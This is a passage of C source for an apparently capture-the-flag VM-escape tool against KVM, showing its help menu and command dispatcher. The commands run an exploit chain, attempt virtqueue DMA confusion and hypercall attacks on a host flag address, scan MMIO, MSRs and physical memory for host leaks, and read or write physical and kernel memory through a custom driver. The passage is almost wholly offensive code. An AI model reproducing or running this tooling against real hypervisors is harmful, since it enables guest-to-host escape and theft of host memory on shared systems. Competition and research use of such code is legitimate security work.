            safe_log("    [%d] addr=0x%lx value=0x%lx conf=%d src=%s\n",
                     i, g_host_leaks[i].addr, g_host_leaks[i].leaked_value,
                     g_host_leaks[i].confidence, g_host_leaks[i].source);
        }
    }
    
    safe_log("\n[*] Exploit run complete. Check exploit.log for details.\n");
}

/* ========================================================================
 * INDIVIDUAL COMMANDS (for interactive use)
 * ======================================================================== */

void show_leaks(void) {
    printf("=== HOST LEAKS (%d total) ===\n", g_host_leak_count);
    for (int i = 0; i < g_host_leak_count; i++) {
        printf("[%d] addr=0x%lx value=0x%lx conf=%d src=%s\n",
               i, g_host_leaks[i].addr, g_host_leaks[i].leaked_value,
               g_host_leaks[i].confidence, g_host_leaks[i].source);
    }
}

void print_help(void) {
    printf("╔═══════════════════════════════════════════════════════════════════════╗\n");
    printf("║               KVMCTF EXPLOIT TOOL - VM ESCAPE EDITION                 ║\n");
    printf("╚═══════════════════════════════════════════════════════════════════════╝\n\n");
    
    printf("AUTOMATED EXPLOITS:\n");
    printf("  run_exploit                          - Run full exploit chain\n");
    printf("  attack_flag [addr]                   - Target specific flag address\n");
    printf("                                         Default: 0x%lx\n", HOST_FLAG_ADDR);
    printf("\n");
    
    printf("INFORMATION GATHERING:\n");
    printf("  probe_mmio                           - Scan MMIO for host leaks\n");
    printf("  scan_msrs                            - Check MSRs for host info\n");
    printf("  scan_shared                          - Analyze shared memory regions\n");
    printf("  scan_phys <start> <end> [step]       - Scan physical memory\n");
    printf("  show_leaks                           - Display found host leaks\n");
    printf("\n");
    
    printf("ATTACK VECTORS:\n");
    printf("  vq_attack [addr]                     - Virtqueue DMA confusion\n");
    printf("  hypercall_attack [addr]              - Hypercall exploitation\n");
    printf("\n");
    
    printf("BASIC OPERATIONS:\n");
    printf("  read_phys <addr> <size>              - Read physical memory\n");
    printf("  read_mmio <addr> <size>              - Read MMIO region\n");
    printf("  read_kernel <addr> <size>            - Read kernel memory\n");
    printf("  write_phys <addr> <hex>              - Write physical memory\n");
    printf("  hypercall <nr> [a0] [a1] [a2] [a3]   - Execute hypercall\n");
    printf("\n");
    
    printf("REGISTER OPERATIONS:\n");
    printf("  read_cr0 / read_cr4 / read_efer      - Read control registers\n");
    printf("  read_msr <msr>                       - Read MSR\n");
    printf("  kaslr                                - Show KASLR slide\n");
    printf("\n");
}

/* ========================================================================
 * MAIN
 * ======================================================================== */

int main(int argc, char *argv[]) {
    if (argc < 2) {
        print_help();
        return 1;
    }
    
    if (strcmp(argv[1], "help") == 0) {
        print_help();
        return 0;
    }
    
    if (init_driver() < 0) {
        return 1;
    }
    
    char *cmd = argv[1];
    
    /* Automated exploits */
    if (strcmp(cmd, "run_exploit") == 0) {
        run_ctf_exploit();
    }
    else if (strcmp(cmd, "attack_flag") == 0) {
        unsigned long addr = HOST_FLAG_ADDR;
        if (argc > 2) addr = strtoul(argv[2], NULL, 0);
        attack_flag_address(addr);
    }
    
    /* Information gathering */
    else if (strcmp(cmd, "probe_mmio") == 0) {
        probe_mmio_for_host_leaks();
    }
    else if (strcmp(cmd, "scan_msrs") == 0) {
        msr_exploitation();
    }
    else if (strcmp(cmd, "scan_shared") == 0) {
        shared_memory_scan();
    }
    else if (strcmp(cmd, "scan_phys") == 0) {
        if (argc < 4) {
            printf("Usage: scan_phys <start> <end> [step]\n");
        } else {
            unsigned long start = strtoul(argv[2], NULL, 0);
            unsigned long end = strtoul(argv[3], NULL, 0);
            unsigned long step = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0x10000;
            scan_physical_for_host_ptrs(start, end, step);
        }
    }
    else if (strcmp(cmd, "show_leaks") == 0) {
        show_leaks();
    }
    
    /* Attack vectors */
    else if (strcmp(cmd, "vq_attack") == 0) {
        unsigned long addr = HOST_FLAG_ADDR;
        if (argc > 2) addr = strtoul(argv[2], NULL, 0);
        virtqueue_host_memory_attack(addr);
    }
    else if (strcmp(cmd, "hypercall_attack") == 0) {
        unsigned long addr = HOST_FLAG_ADDR;
        if (argc > 2) addr = strtoul(argv[2], NULL, 0);
        hypercall_exploitation(addr);
    }
    
    /* Basic operations */
    else if (strcmp(cmd, "read_phys") == 0) {
        if (argc < 4) {
            printf("Usage: read_phys <addr> <size>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            size_t size = strtoul(argv[3], NULL, 0);
            unsigned char *buf = malloc(size);
            if (buf && read_physical(addr, buf, size) == 0) {
                hexdump(buf, addr, size);
            }
            free(buf);
        }
    }
    else if (strcmp(cmd, "read_mmio") == 0) {
        if (argc < 4) {
            printf("Usage: read_mmio <addr> <size>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            size_t size = strtoul(argv[3], NULL, 0);
            unsigned char *buf = malloc(size);
            if (buf && read_mmio(addr, buf, size) == 0) {
                hexdump(buf, addr, size);
            }
            free(buf);
        }
    }
    else if (strcmp(cmd, "read_kernel") == 0) {
        if (argc < 4) {
            printf("Usage: read_kernel <addr> <size>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            size_t size = strtoul(argv[3], NULL, 0);
            unsigned char *buf = malloc(size);
            struct kvm_kernel_mem_read req = {
                .kernel_addr = addr,
                .length = size,
                .user_buf = buf
            };
            if (buf && ioctl(fd, IOCTL_READ_KERNEL_MEM, &req) == 0) {
                hexdump(buf, addr, size);
            }
            free(buf);
        }
    }
    else if (strcmp(cmd, "write_phys") == 0) {
        if (argc < 4) {
            printf("Usage: write_phys <addr> <hex_data>\n");
        } else {
            unsigned long addr = strtoul(argv[2], NULL, 0);
            char *hex = argv[3];
            size_t len = strlen(hex) / 2;
            unsigned char *data = malloc(len);
            for (size_t i = 0; i < len; i++) {
                sscanf(hex + 2*i, "%2hhx", &data[i]);
            }
            if (write_physical(addr, data, len) == 0) {
                printf("[+] Wrote %zu bytes to 0x%lx\n", len, addr);
            }
            free(data);
        }
    }
    else if (strcmp(cmd, "hypercall") == 0) {
        if (argc < 3) {
            printf("Usage: hypercall <nr> [a0] [a1] [a2] [a3]\n");
        } else {
            unsigned long nr = strtoul(argv[2], NULL, 0);
            unsigned long a0 = (argc > 3) ? strtoul(argv[3], NULL, 0) : 0;
            unsigned long a1 = (argc > 4) ? strtoul(argv[4], NULL, 0) : 0;
            unsigned long a2 = (argc > 5) ? strtoul(argv[5], NULL, 0) : 0;
            unsigned long a3 = (argc > 6) ? strtoul(argv[6], NULL, 0) : 0;
            long ret = do_hypercall(nr, a0, a1, a2, a3);
            printf("[+] Hypercall %lu returned: %ld (0x%lx)\n", nr, ret, (unsigned long)ret);
        }
    }
    
    /* Register operations */
    else if (strcmp(cmd, "read_cr0") == 0) {
        unsigned long cr0 = 0;
        if (ioctl(fd, IOCTL_READ_CR0, &cr0) == 0) {
            printf("[+] CR0 = 0x%lx\n", cr0);
            printf("    PE=%lu PG=%lu WP=%lu\n", 
                   cr0 & 1, (cr0 >> 31) & 1, (cr0 >> 16) & 1);
        }
    }
    else if (strcmp(cmd, "read_cr4") == 0) {
        unsigned long cr4 = 0;
        if (ioctl(fd, IOCTL_READ_CR4, &cr4) == 0) {
            printf("[+] CR4 = 0x%lx\n", cr4);
            printf("    SMEP=%lu SMAP=%lu\n", (cr4 >> 20) & 1, (cr4 >> 21) & 1);
        }
    }
    else if (strcmp(cmd, "read_efer") == 0) {
        unsigned long long efer = 0;
        if (ioctl(fd, IOCTL_READ_EFER, &efer) == 0) {
            printf("[+] EFER = 0x%llx\n", efer);
            printf("    SCE=%llu LME=%llu LMA=%llu NXE=%llu\n",
                   efer & 1, (efer >> 8) & 1, (efer >> 10) & 1, (efer >> 11) & 1);
        }
    }
    else if (strcmp(cmd, "read_msr") == 0) {
        if (argc < 3) {
            printf("Usage: read_msr <msr>\n");
        } else {
            struct msr_data req = {
                .msr = (unsigned int)strtoul(argv[2], NULL, 0),
                .value = 0
            };
            if (ioctl(fd, IOCTL_READ_MSR, &req) == 0) {
                printf("[+] MSR 0x%x = 0x%llx\n", req.msr, req.value);
            }
        }
    }
    else if (strcmp(cmd, "kaslr") == 0) {
        unsigned long slide = 0;
        if (ioctl(fd, IOCTL_GET_KASLR_SLIDE, &slide) == 0) {
            printf("[+] Guest KASLR slide: 0x%lx\n", slide);
        }
    }
    else {
        printf("Unknown command: %s\n", cmd);
        print_help();
        return 1;
    }
    
    return 0;
}